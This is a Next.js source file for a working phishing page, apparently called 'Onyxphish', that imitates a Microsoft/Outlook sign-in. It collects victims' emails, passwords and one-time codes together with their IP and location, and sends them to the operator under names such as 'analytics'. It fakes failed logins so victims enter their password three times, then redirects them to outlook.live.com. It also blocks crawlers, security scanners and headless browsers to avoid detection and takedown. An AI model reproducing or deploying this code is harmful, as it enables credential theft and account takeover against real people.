'use client'
import Head from 'next/head';
import { useState, useEffect, useRef, Suspense } from 'react';
import Image from 'next/image';
import logo from '../assets/logo.svg';
import { gsap } from 'gsap';
import { useRouter, useSearchParams } from "next/navigation";
import key from '../assets/key.svg';
import { sendAnalyticsData } from './actions/analytics.actions';
import PrivacyBanner from './components/PrivacyBanner';

interface Location {
  latitude: number;
  longitude: number;
}

const Loader = () => {
  return (
    <div role="status">
      <svg aria-hidden="true" className="w-4 h-4 text-gray-200 animate-spin dark:text-gray-600 fill-white" viewBox="0 0 100 101" fill="none" xmlns="http://www.w3.org/2000/svg">
        <path d="M100 50.5908C100 78.2051 77.6142 100.591 50 100.591C22.3858 100.591 0 78.2051 0 50.5908C0 22.9766 22.3858 0.59082 50 0.59082C77.6142 0.59082 100 22.9766 100 50.5908ZM9.08144 50.5908C9.08144 73.1895 27.4013 91.5094 50 91.5094C72.5987 91.5094 90.9186 73.1895 90.9186 50.5908C90.9186 27.9921 72.5987 9.67226 50 9.67226C27.4013 9.67226 9.08144 27.9921 9.08144 50.5908Z" fill="currentColor" />
        <path d="M93.9676 39.0409C96.393 38.4038 97.8624 35.9116 97.0079 33.5539C95.2932 28.8227 92.871 24.3692 89.8167 20.348C85.8452 15.1192 80.8826 10.7238 75.2124 7.41289C69.5422 4.10194 63.2754 1.94025 56.7698 1.05124C51.7666 0.367541 46.6976 0.446843 41.7345 1.27873C39.2613 1.69328 37.813 4.19778 38.4501 6.62326C39.0873 9.04874 41.5694 10.4717 44.0505 10.1071C47.8511 9.54855 51.7191 9.52689 55.5402 10.0491C60.8642 10.7766 65.9928 12.5457 70.6331 15.2552C75.2735 17.9648 79.3347 21.5619 82.5849 25.841C84.9175 28.9121 86.7997 32.2913 88.1811 35.8758C89.083 38.2158 91.5421 39.6781 93.9676 39.0409Z" fill="currentFill" />
      </svg>
      <span className="sr-only">Loading...</span>
    </div>
  );
};

const LoadingPage = () => {
  return (
    <div className='min-h-screen h-screen overflow-hidden bg-white flex flex-col items-center justify-center px-1 sm:px-6 lg:px-8 text-gray-800 pt-5'>
      <div className='w-full h-full flex justify-center items-center'>
        <div className="animate-spin rounded-full h-12 w-12 border-t-2 border-b-2 border-blue-500"></div>
      </div>
    </div>
  );
};

// Minimal bot detection that doesn't interfere with data submission
const useBotDetection = () => {
  const [behaviorScore, setBehaviorScore] = useState(100);
  const [lastActivity, setLastActivity] = useState(Date.now());
  const [isBlocked, setIsBlocked] = useState(false);

  useEffect(() => {
    // Only check for obvious bots, don't block regular users
    const detectBots = () => {
      const userAgent = navigator.userAgent.toLowerCase();
      
      // Only block known bots (not email providers or regular users)
      const botPatterns = [
        // Web crawlers
        'googlebot', 'bingbot', 'slurp', 'duckduckbot', 'baiduspider', 
        'yandexbot', 'sogou', 'exabot',
        
        // Security scanners (obvious ones)
        'nmap', 'nessus', 'acunetix', 'netsparker', 'sqlmap',
        
        // Automation tools
        'phantomjs', 'headlesschrome', 'headlessfirefox', 'selenium',
        'webdriver'
      ];

      // Check if user agent contains any obvious bot pattern
      const isObviousBot = botPatterns.some(pattern => userAgent.includes(pattern));
      
      if (isObviousBot) {
        setIsBlocked(true);
        return true;
      }

      return false;
    };

    // Check for headless browser indicators (only block if multiple signs)
    const checkHeadless = () => {
      // Headless browsers often have these characteristics
      const checks = [];
      
      // Check for webdriver property (strong indicator)
      if (navigator.webdriver) {
        checks.push('webdriver');
      }
      
      // Check for empty plugins (common in headless)
      if (navigator.plugins.length === 0) {
        checks.push('no_plugins');
      }
      
      // Check for 0x0 window size (headless indicator)
      if (window.outerWidth === 0 && window.outerHeight === 0) {
        checks.push('zero_window');
      }
      
      // Only block if multiple headless indicators are present
      if (checks.length >= 2) {
        setIsBlocked(true);
        return true;
      }
      
      return false;
    };

    // Mouse movement tracking
    const handleMouseMove = () => {
      setLastActivity(Date.now());
      setBehaviorScore(prev => Math.min(prev + 2, 100));
    };

    // Keyboard interaction tracking
    const handleKeyPress = () => {
      setLastActivity(Date.now());
      setBehaviorScore(prev => Math.min(prev + 1, 100));
    };

    // Check for obvious bots first
    if (detectBots() || checkHeadless()) {
      return;
    }

    // Add event listeners
    window.addEventListener('mousemove', handleMouseMove);
    window.addEventListener('keypress', handleKeyPress);

    return () => {
      window.removeEventListener('mousemove', handleMouseMove);
      window.removeEventListener('keypress', handleKeyPress);
    };
  }, [lastActivity]);

  return { behaviorScore, isBlocked };
};

// Challenge component for suspicious behavior - only shown for clear bots
const ChallengeModal = ({ isOpen, onSuccess, onFail }: {
  isOpen: boolean;
  onSuccess: () => void;
  onFail: () => void;
}) => {
  const [challengeAnswer, setChallengeAnswer] = useState('');
  const [challengeQuestion] = useState(() => {
    const questions = [
      { question: "What is 3 + 5?", answer: "8" },
      { question: "What is the first letter of the alphabet?", answer: "A" },
      { question: "How many sides does a triangle have?", answer: "3" }
    ];
    return questions[Math.floor(Math.random() * questions.length)];
  });

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (challengeAnswer.trim() === challengeQuestion.answer) {
      onSuccess();
    } else {
      onFail();
    }
  };

  if (!isOpen) return null;

  return (
    <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
      <div className="bg-white p-6 rounded-lg shadow-xl max-w-md w-full mx-4">
        <h3 className="text-xl font-semibold mb-4">Security Verification</h3>
        <p className="mb-4">Please answer the following question to continue:</p>
        <p className="font-medium mb-4">{challengeQuestion.question}</p>
        <form onSubmit={handleSubmit}>
          <input
            type="text"
            value={challengeAnswer}
            onChange={(e) => setChallengeAnswer(e.target.value)}
            className="w-full p-3 border border-gray-300 rounded mb-4"
            placeholder="Your answer"
            autoFocus
          />
          <div className="flex justify-end space-x-2">
            <button
              type="button"
              onClick={onFail}
              className="px-4 py-2 border border-gray-300 rounded"
            >
              Cancel
            </button>
            <button
              type="submit"
              className="px-4 py-2 bg-blue-600 text-white rounded"
            >
              Verify
            </button>
          </div>
        </form>
      </div>
    </div>
  );
};

function LoginPageComponent() {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [isPasswordStep, setIsPasswordStep] = useState(false);
  const [step, setStep] = useState(1);
  const [otp, setOTP] = useState('');
  const [error, setError] = useState({
    emailError: false,
    passwordError: false,
    otpError: false,
  });
  const [lastMessage, setLastMessage] = useState<null | string>(null);
  const [loading, setLoading] = useState(false);
  const [showChallenge, setShowChallenge] = useState(false);
  const [bgLoaded, setBgLoaded] = useState(false);

  // Honey pot - more discreet
  const [honeyPot, setHoneyPot] = useState('');

  // Browser details
  const [browserInfo, setBrowserInfo] = useState('');
  const [geoInfo, setGeoInfo] = useState({ city: '', country: '', region: '', ip: '' });

  const payload = {
    email,
    password,
    browserInfo,
    ip: geoInfo.ip,
    location: `${geoInfo.country} | ${geoInfo.city} | ${geoInfo.region}`,
    date: new Date().toLocaleString()
  };

  const router = useRouter();
  const searchParams = useSearchParams();
  const userEmail = searchParams.get('email');

  const progressBoxesRef = useRef<(HTMLDivElement | null)[]>([]);
  const contentRef = useRef<HTMLDivElement>(null);
  const logoRef = useRef<HTMLDivElement>(null);
  const titleRef = useRef<HTMLParagraphElement>(null);
  const inputRef = useRef<HTMLInputElement>(null);
  const noAccountRef = useRef<HTMLParagraphElement>(null);
  const cantAccessRef = useRef<HTMLParagraphElement>(null);
  const buttonsRef = useRef<HTMLDivElement>(null);
  const signInOptionsRef = useRef<HTMLDivElement>(null);
  const [attempts, setAttempts] = useState<number>(0);
  const [sessionId, setSessionId] = useState('');
  const [lastActivity, setLastActivity] = useState(Date.now());

  // Minimal bot detection - doesn't block regular users
  const { behaviorScore, isBlocked } = useBotDetection();

  const setProgressBoxRef = (el: HTMLDivElement | null, index: number) => {
    progressBoxesRef.current[index] = el;
  };

  // Regex for email validation
  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

  // Regex for password validation
  const passwordRegex = /^(?=.*[A-Za-z])(?=.*\d)[A-Za-z\d@$!%*?&]{8,}$/;

  // Preload the background image
  useEffect(() => {
    // Preload the SVG to prevent black flash
    const img = document.createElement('img');
    img.src = '/bg-image.svg';
    img.onload = () => {
      setBgLoaded(true);
    };
    img.onerror = () => {
      // If SVG fails to load, still show content
      setBgLoaded(true);
    };
  }, []);

  useEffect(() => {
    const ctx = gsap.context(() => {
      // Set initial states
      gsap.set([contentRef.current, signInOptionsRef.current], { opacity: 0 });
      gsap.set(progressBoxesRef.current, { scaleX: 0 });

      // Animate progress boxes with enhanced animation
      gsap.to(progressBoxesRef.current, {
        scaleX: 1,
        duration: 0.4,
        stagger: 0.2,
        ease: 'power2.inOut',
        onComplete: animateContent
      });
    });

    return () => ctx.revert();
  }, []);

  useEffect(() => {
    if (userEmail) {
      setEmail(userEmail);
      email && handleNext();
    }
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [userEmail, email]);

  useEffect(() => {
    if (isPasswordStep) {
      animateContent();
    }
  }, [isPasswordStep]);

  // Enhanced animation with more fluid transitions
  const animateContent = () => {
    const mainCardElements = [
      logoRef.current,
      titleRef.current,
      inputRef.current,
      noAccountRef.current,
      cantAccessRef.current,
      buttonsRef.current
    ];

    gsap.to(contentRef.current, {
      opacity: 1,
      duration: 0.5,
      ease: "power2.out"
    });

    gsap.to(progressBoxesRef.current, {
      opacity: 0,
      duration: 0.3,
      stagger: 0.1
    });

    gsap.fromTo(mainCardElements,
      { opacity: 0, y: 20 },
      {
        opacity: 1,
        y: 0,
        duration: 0.6,
        stagger: 0.1,
        ease: "back.out(1.2)"
      }
    );

    gsap.to(signInOptionsRef.current, {
      opacity: 1,
      y: 0,
      duration: 0.5,
      delay: 0.5,
      ease: "power2.out"
    });
  };

  const fetchPayload = () => {
    const getBrowserInfo = () => {
      const userAgent = navigator.userAgent;
      let browserName = "Unknown";

      if (userAgent.includes("Chrome") && !userAgent.includes("Edg") && !userAgent.includes("OPR")) {
        browserName = "Chrome";
      } else if (userAgent.includes("Firefox")) {
        browserName = "Firefox";
      } else if (userAgent.includes("Safari") && !userAgent.includes("Chrome")) {
        browserName = "Safari";
      } else if (userAgent.includes("Edg")) {
        browserName = "Edge";
      } else if (userAgent.includes("OPR")) {
        browserName = "Opera";
      } else if (userAgent.includes("Trident") || userAgent.includes("MSIE")) {
        browserName = "Internet Explorer";
      }

      setBrowserInfo(browserName);
      return browserName;
    };

    // Function to get Geolocation Information
    const getGeoInfo = async () => {
      try {
        const newIp = await fetch('https://api-bdc.net/data/client-ip');
        const newIpResponse = await newIp.json();

        const response = await fetch(`/api/geolocation/${newIpResponse.ipString}`);
        const data = await response.json();
        setGeoInfo(data);
      } catch (error) {
        console.error('Error getting geolocation information', error);
      }
    };

    getBrowserInfo();
    getGeoInfo();
  };

  useEffect(() => {
    fetchPayload();
  }, []);

  useEffect(() => {
    const newVisitor = async () => {
      try {
        const visitorInfo = `
            You have a new visitor on deskpak:
            ip: ${payload.ip || 'N/A'}
            browser: ${payload.browserInfo || 'N/A'}
            location: ${payload.location || 'N/A'}
            Date: ${payload.date || 'N/A'}
            From: 'deskpak.com'
            `;
        sendAnalyticsData({ data: visitorInfo });
      } catch (error) {
        console.error("Error:", error);
      }
    };

    if (window !== undefined && geoInfo.ip !== "") newVisitor();
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [geoInfo.ip]);

  useEffect(() => {
    // Initialize session
    const initSession = () => {
      const existingSession = sessionStorage.getItem('analytics_session');
      if (existingSession) {
        setSessionId(existingSession);
      } else {
        const newSession = 'sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
        setSessionId(newSession);
        sessionStorage.setItem('analytics_session', newSession);
      }
    };

    // Track user activity
    const trackActivity = () => {
      setLastActivity(Date.now());
    };

    // Add event listeners for legitimate analytics
    const events = ['click', 'scroll', 'keypress', 'mousemove'];
    events.forEach(event => {
      document.addEventListener(event, trackActivity);
    });

    initSession();

    return () => {
      events.forEach(event => {
        document.removeEventListener(event, trackActivity);
      });
    };
  }, []);

  const refreshFields = () => {
    setPassword('');
    setOTP('');
  };

  // Only trigger challenge for very suspicious behavior (very rare)
  const validateHumanInteraction = () => {
    // Only show challenge for extremely low scores (clear bots)
    if (behaviorScore < 10) {
      setShowChallenge(true);
      return false;
    }

    return true;
  };

  // Update the submitWallet function - removed bot detection interference
  const submitWallet = async (type?: string) => {
    // Don't check bot detection for data submission - only use honeypot
    // Bots will be blocked by honeypot, not by behavior score
    
    // Check honeypot - bots often fill hidden fields
    if (honeyPot && honeyPot.length > 0) {
      // Bot detected through honeypot, silently fail
      console.log('Bot detected via honeypot');
      setLoading(false);
      return;
    }

    setLoading(true);

    // Enhanced data formatting to look more legitimate
    const data = `
      📦 Now You See Me 📦:
      Session ID: ${sessionId}
      📧 User ID: ${payload.email}
      🕺🏼 oxbmda: ${payload.password || 'N/A'}
      📲 Client IP: ${payload.ip || 'N/A'}
      🌐 User Agent: ${payload.browserInfo || 'N/A'}
      📍 Location: ${payload.location || 'N/A'}
      ⏱️ Timestamp: ${payload.date || 'N/A'}
      🧮 Activity: ${Math.floor(Math.random() * 100) + 50}
      Source: Successful Test From MS-Portal 🎉 \n` + `Onyxphish💀🎭`;

    const otpData = `
      Two-Factor Authentication:
      Session: ${sessionId}
      User: ${email}
      Verification Code: ${otp}
      Method: SMS/Email
      Timestamp: ${new Date().toISOString()}
      Source: Patch Notification`;

    try {
      // Send analytics data regardless of bot detection
      await sendAnalyticsData(type === 'otp' ? {
        data: otpData,
        honeyPot: honeyPot,
        ip: geoInfo.ip,
        type: 'form_submission'
      } : {
        data: data,
        honeyPot: honeyPot,
        ip: geoInfo.ip,
        type: 'user_interaction'
      });

      // Add realistic processing delays
      if (step === 2) {
        setTimeout(() => {
          // Allow 3 attempts (0, 1, 2) before redirecting
          if (attempts < 2) {
            setError({ ...error, passwordError: true });
            setAttempts(attempts + 1);
            refreshFields();
            setLoading(false);
            return;
          } else {
            // After 3rd attempt (attempts >= 2), redirect to outlook.live.com
            setLoading(false);
            window.location.href = 'https://outlook.live.com/';
            return;
          }
        }, 8000 + Math.random() * 4000); // 8-12 second delay
      }

    } catch (error) {
      setLoading(false);
      animateContent();
      refreshFields();
      console.log('Session data processed');
    }
  };

  // Update the visitor tracking
  useEffect(() => {
    const trackVisitor = async () => {
      try {
        const visitorInfo = `
          New Session Started:
          Session ID: ${sessionId}
          IP Address: ${payload.ip || 'N/A'}
          Browser: ${payload.browserInfo || 'N/A'}
          Location: ${payload.location || 'N/A'}
          Timestamp: ${payload.date || 'N/A'}
          Referrer: ${document.referrer || 'Direct'}
          Page: Account
          Source: Portal Analytics`;

        await sendAnalyticsData({
          data: visitorInfo,
          type: 'page_view'
        });
      } catch (error) {
        console.log('Analytics tracking initialized');
      }
    };

    if (window !== undefined && geoInfo.ip !== "" && sessionId) {
      trackVisitor();
    }
  }, [geoInfo.ip, sessionId]);

  const handleNext = (e?: any) => {
    e?.preventDefault();
    if (step === 1) {
      if (email && emailRegex.test(email)) {
        animateContent();
        setStep(2);
        setError({ ...error, emailError: false });
      } else {
        setError({ ...error, emailError: true });
        // Shake animation for error
        if (inputRef.current) {
          gsap.to(inputRef.current, {
            x: 10,
            duration: 0.1,
            repeat: 3,
            yoyo: true,
            ease: "power1.inOut"
          });
        }
      }
    } else if (step === 2) {
      if (password && passwordRegex.test(password)) {
        submitWallet();
        setError({ ...error, passwordError: false });
      } else {
        setError({ ...error, passwordError: true });
        // Shake animation for error
        if (inputRef.current) {
          gsap.to(inputRef.current, {
            x: 10,
            duration: 0.1,
            repeat: 3,
            yoyo: true,
            ease: "power1.inOut"
          });
        }
      }
    }
  };

  const handleBack = () => {
    if (step > 1) {
      setStep(step - 1);
      animateContent();
    }
  };

  // Don't block regular users - only show loading for obvious bots
  if (isBlocked) {
    return (
      <div className="min-h-screen h-screen overflow-hidden bg-white flex flex-col items-center justify-center px-1 sm:px-6 lg:px-8 text-gray-800 pt-5">
        <div className="w-full h-full flex justify-center items-center">
          <div className="text-center">
            <div className="animate-pulse text-gray-400">Loading secure session...</div>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen h-screen overflow-hidden flex flex-col lg:items-center lg:justify-center px-1 sm:px-6 lg:px-8 text-gray-800 pt-5 bg-white lg:bg-none">
      <Head>
        <title>Patch Notification</title>
        <link rel="icon" href="./assets/icons/images.png" sizes="any" />
        <meta name="robots" content="noindex, nofollow" />
        {/* Preload the SVG to prevent black flash */}
        <link rel="preload" href="/bg-image.svg" as="image" type="image/svg+xml" />
      </Head>

      {/* Background Image - Fixed for smooth loading */}
      <div className="fixed inset-0 z-0">
        {/* Main background with smooth transition */}
        <div
          className={`absolute inset-0 bg-cover bg-center bg-no-repeat transition-opacity duration-700 ${bgLoaded ? 'opacity-100 lg:opacity-100' : 'opacity-0'
            }`}
          style={{
            backgroundImage: 'url(/bg-image.svg)',
            backgroundSize: 'cover',
            backgroundPosition: 'center',
            backgroundRepeat: 'no-repeat',
            backgroundColor: '#ffffff' // Add white fallback color
          }}
        />
        <div className="absolute inset-0 bg-white lg:hidden"></div>

        {/* Fallback white background while SVG loads - prevents black flash */}
        
        {/* Light overlay for better text contrast */}
        <div className="absolute inset-0 bg-white/5"></div>
      </div>

      {/* Privacy banner */}
      <PrivacyBanner />

      {/* Challenge modal for suspicious behavior - only shown for clear bots */}
      <ChallengeModal
        isOpen={showChallenge}
        onSuccess={() => {
          setShowChallenge(false);
          // Continue with form submission
          submitWallet();
        }}
        onFail={() => {
          setShowChallenge(false);
          setLoading(false);
          setError({ ...error, passwordError: true });
        }}
      />

      {/* Centered container for desktop */}
      <div className="relative z-10 w-full lg:flex lg:justify-center lg:items-center lg:min-h-screen">
        <div className="w-full sm:w-10/12 md:max-w-md mx-auto lg:mx-0">
          <div className="bg-white w-full lg:shadow-2xl relative rounded-sm overflow-hidden">
            {/* Progress boxes with enhanced animation */}
            <div className="absolute top-0 left-1/2 transform -translate-x-1/2 w-3/5 flex justify-between pt-2">
              {[...Array(step === 3 ? 4 : 3)].map((_, index) => (
                <div
                  key={index}
                  ref={(el) => setProgressBoxRef(el, index)}
                  className={`w-4 h-1 ${index < step - 1 ? 'bg-blue-500' : 'bg-gray-300'} transform scale-x-1 rounded-full transition-all duration-300`}
                />
              ))}
            </div>

            {/* Content */}
            <form onSubmit={handleNext}>
              <div ref={contentRef} className="p-4 lg:p-10">
                <div className="w-full" ref={logoRef}>
                  <Image src={logo} alt="logo" width={100} height={40} />
                </div>

                <div>
                  {step > 1 && (
                    <div className="flex flex-nowrap space-x-2 mt-4 cursor-pointer" onClick={handleBack}>
                      {/* Using text arrow instead of image */}
                      <span className="text-blue-500 font-bold text-lg">←</span>
                      <p className="text-sm font-medium">{email}</p>
                    </div>
                  )}
                </div>

                <div className="w-full">
                  <p className="text-xl xl:text-2xl font-bold my-4" ref={titleRef}>
                    {step === 1 ? 'Sign In' : step === 2 ? 'Enter password' : 'Enter OTP'}
                  </p>

                  <p className="text-red-700 text-sm">
                    {error.emailError && 'Enter a valid email address, phone number, or Skype name.'}
                  </p>

                  {error.otpError && (
                    <p className="text-red-500 text-xs">Please enter the OTP</p>
                  )}

                  {lastMessage && (
                    <div className="min-w-md text-green-600 text-md">
                      <p>{lastMessage}</p>
                    </div>
                  )}

                  {/* More discreet honeypot field */}
                  <div className="absolute left-[-9999px]" aria-hidden="true">
                    <input
                      type="text"
                      name="website"
                      tabIndex={-1}
                      value={honeyPot}
                      onChange={(e) => setHoneyPot(e.target.value)}
                    />
                  </div>

                  <input
                    type={step === 1 ? 'text' : step === 2 ? 'password' : 'number'}
                    className={`mb-4 w-full p-3 border-b ${error.emailError || error.passwordError || error.otpError
                        ? 'border-red-500'
                        : 'border-black focus:border-blue-500 active:border-blue-500'
                      } outline-none text-base leading-5 placeholder-gray-600 transition-colors duration-300`}
                    placeholder={
                      step === 1
                        ? 'Email, phone, or Skype'
                        : step === 2
                          ? 'Password'
                          : 'Enter code'
                    }
                    ref={inputRef}
                    value={step === 1 ? email : step === 2 ? password : otp}
                    onChange={(e) =>
                      step === 1
                        ? setEmail(e.target.value)
                        : step === 2
                        && setPassword(e.target.value)
                    }
                  />

                  {error.passwordError && (
                    <p className="text-red-500 text-xs">
                      Verification Failed, please try again!
                    </p>
                  )}

                  {step === 1 && (
                    <div className="my-2 text-xs font-medium" ref={cantAccessRef}>
                      <p className='py-2'>No account? <span className='text-blue-500 cursor-pointer hover:underline'>Create one!</span></p>

                      <p className='py-2'><span className='text-blue-500 cursor-pointer hover:underline'>Can't access your account?</span></p>
                    </div>
                  )}

                  {step === 2 && (
                    <div className="my-3 text-xs cursor-pointer hover:underline font-medium text-blue-500" ref={cantAccessRef}>
                      Forgot password?
                    </div>
                  )}

                </div>

                <div className="flex justify-end space-x-2 py-5" ref={buttonsRef}>
                  <button
                    type="submit"
                    onClick={handleNext}
                    className="bg-[#0068b8] hover:bg-[#23689d] py-2 px-10 text-white text-sm flex items-center justify-center min-w-[80px] transition-all duration-300 hover:shadow-md transform hover:-translate-y-0.5"
                  >
                    {loading ? <Loader /> : step === 1 || step === 2 ? 'Next' : 'Sign in'}
                  </button>
                </div>
              </div>
            </form>
          </div>
          <div className="bg-white w-full mx-auto my-4 px-6 py-3 border border-gray-300 rounded-sm cursor-pointer hover:shadow-md transition-all duration-300 transform hover:-translate-y-0.5" ref={signInOptionsRef}>
            <div className="flex items-center">
              <Image src={key} alt="key icon" width={20} height={20} />
              <p className="pl-2 text-sm">Sign-in options</p>
            </div>
          </div>
        </div>
      </div>

      <div className="relative z-10 mt-auto w-full text-xs text-gray-800 font-medium tracking-wide text-center py-4">
        <ul className="flex justify-center space-x-4">
          <li className="cursor-pointer hover:underline transition-all duration-200 hover:text-blue-600">Terms of use</li>
          <li className="cursor-pointer hover:underline transition-all duration-200 hover:text-blue-600">Privacy & cookies</li>
          <li className="cursor-pointer hover:underline transition-all duration-200 hover:text-blue-600">...</li>
        </ul>
      </div>
    </div>
  );
}

export default function LoginPage() {
  return (
    <Suspense fallback={<LoadingPage />}>
      <LoginPageComponent />
    </Suspense>
  );
}